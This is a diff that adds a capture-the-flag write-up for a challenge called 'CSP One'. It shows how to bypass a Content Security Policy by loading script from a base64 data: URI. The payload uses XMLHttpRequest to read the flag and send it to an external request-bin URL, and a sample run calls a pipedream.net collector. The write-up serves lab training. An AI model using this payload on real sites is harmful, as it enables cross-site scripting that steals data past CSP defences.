@@ -1,0 +1,30 @@
+# CSP One 
+Bypass the CSP using **data: uri**.
+
+For example for a simple payload of **alert(1)**,
+```
+<script src="data:text/javascript;base64,YWxlcnQoMSk7"> </script>
+```
+
+For this challenge you need to read the flag, you can use XHR: 
+```
+var xhr = new XMLHttpRequest();    
+xhr.open('GET', 'http://[$CHALLENGE_IP]/csp-one-flag', true);
+xhr.onload = function () {
+var request = new XMLHttpRequest();
+request.open('GET', 'http://[$REQUEST_BIN_URI]?flag='+xhr.responseText, true);
+request.send()
+};
+xhr.send(null);
+```
+
+Base64 encode it and use it as follows, 
+```
+<script src="data:text/javascript;base64,[$BASE64_OF_SCRIPT]"></script> 
+```
+
+You can create this using solution.py,
+```
+python solution.py [$CHALLENGE_URL] [$REQUEST_BIN_URL]
+python solution.py http://192.168.86.180:8000 http://endiel6lj35l8.x.pipedream.net
+```
